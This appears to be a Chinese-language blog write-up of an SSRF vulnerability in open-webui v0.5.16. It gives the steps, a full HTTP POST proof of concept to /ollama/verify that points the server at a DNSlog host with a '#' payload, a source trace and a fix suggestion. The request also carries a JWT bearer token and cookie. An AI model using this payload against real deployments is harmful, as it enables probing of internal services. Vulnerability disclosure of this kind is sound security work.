---
title: open-webui_ssrf漏洞
date: 2025-03-01 14:39:21
tags:
---

# 1.影响版本

![image-20250301144310748](open-webui-ssrf漏洞/image-20250301144310748.png)

版本：v0.5.16

# 2.攻击步骤

访问 设置-外部链接-管理Ollama API连接

![image-20250301144356272](open-webui-ssrf漏洞/image-20250301144356272.png)

url填入：http://2223.xdoko0gi.eyes.sh/?id=1' or 1=1 -- # 后点击右边的测试按钮

```
http://2223.xdoko0gi.eyes.sh/?id=1' or 1=1 -- #
```

![image-20250301144933103](open-webui-ssrf漏洞/image-20250301144933103.png)

查看dnslog平台的web日志，如下图，成功利用服务器发起了任意形式的GET请求攻击，验证了SSRF攻击存在

![image-20250301144959765](open-webui-ssrf漏洞/image-20250301144959765.png)

POC如下

```
POST /ollama/verify HTTP/1.1
Host: localhost:8080
Content-Length: 66
sec-ch-ua: 
Accept: application/json
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmM2RmNzE5LWE0NGUtNDVkNC1hZGJkLWRiNWRhNmVjNzg4OSJ9.enDXNwjdUApgnnkE71G8eznz87KTQwRNQ9RKODnaSS4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/admin/settings
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmM2RmNzE5LWE0NGUtNDVkNC1hZGJkLWRiNWRhNmVjNzg4OSJ9.enDXNwjdUApgnnkE71G8eznz87KTQwRNQ9RKODnaSS4
Connection: close

{"url":"http://2223.xdoko0gi.eyes.sh/?id=1' or 1=1 -- #","key":""}
```

为什么要用 # 注释符？

如下图所示，如果没用#则url会自动拼接上 /api/version, 可能会影响正常攻击payload（如sql注入攻击并不会用到/api/version）

![image-20250301151957826](open-webui-ssrf漏洞/image-20250301151957826.png)



# 3.源码跟踪

漏洞原理：利用#注释符注释掉了默认添加在url后面的 /api/version,达到了SSRF漏洞

如POC所示，程序向/ollama/verify发起了POST请求，请求参数为

```
{"url":"http://2223.xdoko0gi.eyes.sh/?id=1' or 1=1 -- #","key":""}
```

![image-20250301150939879](open-webui-ssrf漏洞/image-20250301150939879.png)

根据 /ollama/verify路由可以找到处理该路径的函数

![image-20250301151635154](open-webui-ssrf漏洞/image-20250301151635154.png)

该函数位于 /routers/ollama/verify中,如 185、186行所示，该函数会从表单中获取名为url、key的参数值

在193行，f"{url}/api/version", 中，将用户输入的url直接拼接上 /api/version (此处可以用 # 进行绕过)

```
async with session.get(
                f"{url}/api/version",
                headers={**({"Authorization": f"Bearer {key}"} if key else {})},
            )
```

最后将拼接好的url和headers发起get请求

# 4.修复建议

在url拼接前，对用户的输入进行严格限制，如不允许输入特殊字符#
